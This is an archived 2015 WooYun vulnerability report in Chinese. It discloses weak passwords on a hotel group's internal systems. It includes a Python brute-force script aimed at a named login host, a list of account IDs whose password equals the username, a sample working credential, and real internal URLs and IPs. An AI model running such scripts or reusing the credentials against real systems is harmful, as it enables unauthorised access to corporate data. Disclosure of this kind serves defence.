{"id": 65928, "wybug_id": "wooyun-2015-0137267", "wybug_title": "格林豪泰弱口令可登陆多个内部系统（附测试脚本）", "wybug_corp": "格林豪泰酒店管理集团", "wybug_author": "路人甲", "wybug_date": "2015-08-27 10:16", "wybug_open_date": "2015-10-15 15:18", "wybug_type": "服务弱口令", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-31：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-09-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-15：\t细节向公众公开  简要描述： 弱口令泄漏大量信息代码渣渣，仅供测试 详细说明：  http://mis.998.com/GreenTreeInn/Login.aspx\n\n该系统存在大量弱口令而且多个系统的密码都是一样的这里仅仅测试密码一致的用户测试从121700到121999的用户其中\n121725121748121766121769121770121782121792121793121794121810121811121818121822121840121845121850121851121853121861121873121898121907121909121913121917121935121937121938121942121944121955121956121959\n用户名与密码一致测试脚本如下\nimport urllibimport urllib2import sys   import httplibreload(sys)       def http_post(mssid):\t\theaders = {'Content-Type': 'text/html; charset=utf-8','User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0'}\tconn = httplib.HTTPConnection('mis.998.com',timeout=60)\t\tconn.request(method='GET',                     url='/GreenTreeInn/Login.aspx?__VIEWSTATE=%2FwEPDwUJLTc5ODM1MjU1ZGT30ltSa%2BaePtUM7nljNu8o%2B6C%2B%2BnSemxsTdnigxZ917A%3D%3D&Button1=&__VIEWSTATEGENERATOR=D163A9F1&__EVENTVALIDATION=%2FwEdAATt7vpG6L5elJ6XYvxzyyJxwFzS9Q9XYLeSu6PO5aruGM34O%2FGfAV4V4n0wgFZHr3fWF4n%2F0eHNkrycm50r%2BqLZUgUG6wYq6sEpWbM867W%2BzAXrCND7Dl0vpAgSNMVLcTc%3D&txt_uname='+mssid+'&txt_upwd='+mssid,                     headers = headers)\t        resp = conn.getresponse()        html_doc = resp.read()        conn.close()   \tif resp.getheader(\"set-cookie\").count(mssid+'@998.com') >0:\t\tprint mssid \t#print resp.getheader(\"set-cookie\") \t#print type(resp.msg)\t\t#print resp.msg.getplist()\t#return html_docfor i in range(121700,121999):\tsys.setdefaultencoding('utf-8') \thttp_post(str(i))\n参考 WooYun: 格林豪泰弱口令可登陆多个系统，且可以SQL注入 同一个用户可以登录\nhttp://101.227.68.206/Home/logIn?ReturnUrl=%2Fhttp://mis.998.com:5655/Home/Logonhttp://mis.998.com/GreenTreeInn/Login.aspxhttp://101.227.68.208/Login.aspxhttp://oa.998.comhttp://erp.998.comhttp://bill.998.com/login;jsessionid=126414A1ED950FE55FAC7C13B7F93F47\n这些应用   漏洞证明：  这里取一例用户名121937 密码121937mis系统http://mis.998.com/\n\n\n\n报表系统http://101.227.68.208/Login.aspx\n\n\n\n预算系统http://mis.998.com:5655/Home/Logon\n\n\n\n\n\noa系统  http://oa.998.com/main.jsp（这个系统加了验证码，但是验证码好像形同虚设。还是可以进行爆破）\n\n\n\n联系人信息\n\n\n\nCRS系统   http://101.227.68.206/home/logon?ReturnUrl=%2f\n\n\n\n\n\n\n\n新业务平台http://erp.998.com/\n\n\n\n应收系统 http://bill.998.com/login;jsessionid=46678D0EEBB695C37C95D79A2D474C32\n\n\n\n各种信息\n\n\n\n\n\n其他就不查看sql注入未测试   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2015-08-31 15:17 厂商回复： 感谢对格林的关注，已处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}